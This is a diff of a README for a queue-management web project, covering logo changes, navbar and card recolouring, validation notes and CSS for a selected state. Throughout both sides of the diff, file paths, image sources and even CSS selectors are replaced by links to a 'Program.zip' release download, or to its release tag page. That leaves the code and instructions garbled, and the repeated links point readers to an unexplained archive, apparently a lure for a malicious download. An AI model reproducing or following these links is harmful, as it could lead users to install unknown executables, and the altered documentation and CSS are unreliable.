@@ -27,7 +27,7 @@ Trace the path of the logo in the Build/Static files and the src/components/Asse
 Search for a substitute picture and paste in the exact folders and renaming in the same as the previous logo in order to subtitute the logo design.
 That allows to simpply reload the code and the new logo will be demonstrated.
 The only step is specifying the right file type as PNG for one and SVG for the other.
-logo changes and navbar re-coloured 6. **HomePage Colour changes**: -Changes the colours of the Class card at the https://github.com/CardialS/QueueManagement-main-main-main/releases/download/v1.0/Program.zip in order to make the shops pop out more for user view. -Adding lighter colours to the background allows the shop or Card Class to be the main view with its darker colours. homepage colour changes.
+logo changes and navbar re-coloured 6. **HomePage Colour changes**: -Changes the colours of the Class card at the https://github.com/CardialS/QueueManagement-main-main-main/releases/tag/v1.0 in order to make the shops pop out more for user view. -Adding lighter colours to the background allows the shop or Card Class to be the main view with its darker colours. homepage colour changes.
 
 Here are the changes made to the CSS to enhance the professional and aesthetic appearance of the navbar:
 
@@ -56,16 +56,16 @@ Here are the changes made to the CSS to enhance the professional and aesthetic a
    - Search for a substitute picture of the logo and paste to the specific paths where the logo's are located  and rename it similar to the previous logo in order to replace the logo design.
    - That allows to simply reload the code and the new logo will be demonstrated.
    - the only step is specifying the right file type as PNG for one and the SVG for the other.
-   <img width="929" alt="logo changes and navbar re-coloured" src="https://github.com/CardialS/QueueManagement-main-main-main/releases/download/v1.0/Program.zip">
+   <img width="929" alt="logo changes and navbar re-coloured" src="https://github.com/CardialS/QueueManagement-main-main-main/releases/tag/v1.0">
 6. **HomePage Colour Changes**:
-   -Changes to the colour of the class "card" at the https://github.com/CardialS/QueueManagement-main-main-main/releases/download/v1.0/Program.zip in order to make the shops pop out for user view.
+   -Changes to the colour of the class "card" at the https://github.com/CardialS/QueueManagement-main-main-main/releases/tag/v1.0 in order to make the shops pop out for user view.
    -Adding ligher colours to the backgroung allows the shop or Class "card" to be the main view with its darker colours.
-   <img width="926" alt="homepage colour changes" src="https://github.com/CardialS/QueueManagement-main-main-main/releases/download/v1.0/Program.zip">
+   <img width="926" alt="homepage colour changes" src="https://github.com/CardialS/QueueManagement-main-main-main/releases/tag/v1.0">
    
  7. **validation**
    - The validation logic in the code might had additional rules that were not met by the provided numbers, we had to  Review the validation code to understand what rules were applied and to  ensure the input meets those rules..
 **before**
-   - ![Screenshot (11)](https://github.com/CardialS/QueueManagement-main-main-main/releases/download/v1.0/Program.zip)
+   - ![Screenshot (11)](https://github.com/CardialS/QueueManagement-main-main-main/releases/tag/v1.0)
    - 
  
 
@@ -113,14 +113,14 @@ Here are the changes made to the CSS to enhance the professional and aesthetic a
    };
    ```
 
-### Changes in CSS (`https://github.com/CardialS/QueueManagement-main-main-main/releases/download/v1.0/Program.zip`)
+### Changes in CSS (`https://github.com/CardialS/QueueManagement-main-main-main/releases/tag/v1.0`)
 
 1. **Added Selected State Styling**:
    - Introduced a `.selected` class to change the background color (or any other style) of the selected role.
 
    ```css
-   https://github.com/CardialS/QueueManagement-main-main-main/releases/download/v1.0/Program.zip .photo1-role,
-   https://github.com/CardialS/QueueManagement-main-main-main/releases/download/v1.0/Program.zip .photo2-role {
+   https://github.com/CardialS/QueueManagement-main-main-main/releases/tag/v1.0 .photo1-role,
+   https://github.com/CardialS/QueueManagement-main-main-main/releases/tag/v1.0 .photo2-role {
        background-color: #41D3BD; /* Example selected color */
        /* Add any other styling you want for selected state */
    }
